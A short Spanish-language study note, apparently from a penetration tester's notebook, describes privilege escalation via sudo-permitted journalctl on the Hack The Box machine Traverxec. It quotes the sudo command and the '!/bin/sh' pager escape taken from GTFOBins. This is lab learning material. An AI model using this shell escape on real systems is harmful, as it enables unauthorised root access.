
## DESCRIPTION



#### Mas información
* gtfobins.github.io/gtfobins/journalctl


## EXPLOITATION

EXPLOTATION: gtfobins.github.io/gtfobins/journalctl/ → introducimos !/bin/sh

EJEMPLO:

Encontramos un fichero que tiene el siguiente contenido:

![[Pasted image 20230606182446.png]]

Por lo tanto vemos que tiene en el SUDOERS permitido ejecutar todo ese comando hasta la pipe → /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service 

Lo ejecutamos y utilizamos la escala de privilegios de tfgbins → https://gtfobins.github.io/gtfobins/journalctl/ → introducimos !/bin/sh

![[Pasted image 20230606182450.png]]

Escribimos aquí directamente:

![[Pasted image 20230606182458.png]]

## MACHINES

* Hack The Box: TRAVERXEC
